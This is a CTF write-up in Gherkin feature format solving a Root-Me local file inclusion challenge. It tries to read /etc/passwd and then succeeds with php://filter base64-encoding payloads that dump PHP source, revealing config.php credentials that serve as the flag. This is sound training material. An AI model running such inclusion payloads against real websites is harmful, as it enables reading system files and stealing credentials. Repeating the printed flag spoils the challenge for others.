## Version 2.0
## language: en

Feature:
  Site:
    Root-Me
  Category:
    CTF
  User:
    Ar4m1r3z
  Goal:
    get the flag

  Background:
  Hacker's software:
    | <Software name> | <Version>   |
    | Kali Linux      | 2020.1      |
    | Firefox Quantum | 68.2Oesr    |
    | Curl            | 7.71.0      |
  Machine information:
    Given I have a website
    And it contains a login

  Scenario: Fail: file /etc/passwd
    Given I have this URL
    """
    http://challenge01.root-me.org/web-serveur/ch12/?inc=login.php
    """
    When I see that it contains a variable "inc"
    And as a value it is a "login.php" file
    Then I see that I can do "LFI"
    And I decide to access the "etc/passwd" this way
    """
    http://challenge01.root-me.org/web-serveur/ch12/?inc=/etc/passwd
    """
    When I see that it hasn't worked out
  
  Scenario: Fail: code file ch12.php
    Given the LFI didn't work
    When I see that the challenge says to use "Filter"
    Then I decide to find out what the Filer is for.
    And the "Filter" serves to display the source code of ".php"
    When I run the filter to see the code for "login.php"
    """
    http://challenge01.root-me.org/web-serveur/ch12/?
    inc=php://filter/convert.base64-encode/resource=index.php
    """
    Again I see you have a HASH on base64
    When I say the hash I see that it has a php code
    And the code includes another ".php" file
    When I try to run that file on the URL
    """
    http://challenge01.root-me.org/web-serveur/ch12/?inc=ch12.php
    """
    And it didn't wor

  Scenario: Success: Flag
    Given I don't work with the URL
    When I decide to use the "Filter"
    """
    http://challenge01.root-me.org/web-serveur/ch12/?
      inc=php://filter/convert.base64-encode/resource=ch12.php
    """
    Then I see have another HASH base64
    And I decide to figure it out this way
    """
    $ cat code | base64 --decode > archivo
    """
    When I see that I have another PHP file and it's called "config.php"
    Then I use Filter
    """
    http://challenge01.root-me.org/web-serveur/ch12/?
      inc=php://filter/convert.base64-encode/resource=config.php
    """
    Then I see that it generates another HASH base64
    When there's a password and user
    """
    <?php
    $username="admin";
    $password="DAPt9D2mky0APAF";
    ?>
    """
    Then I test the password with the flag and it works
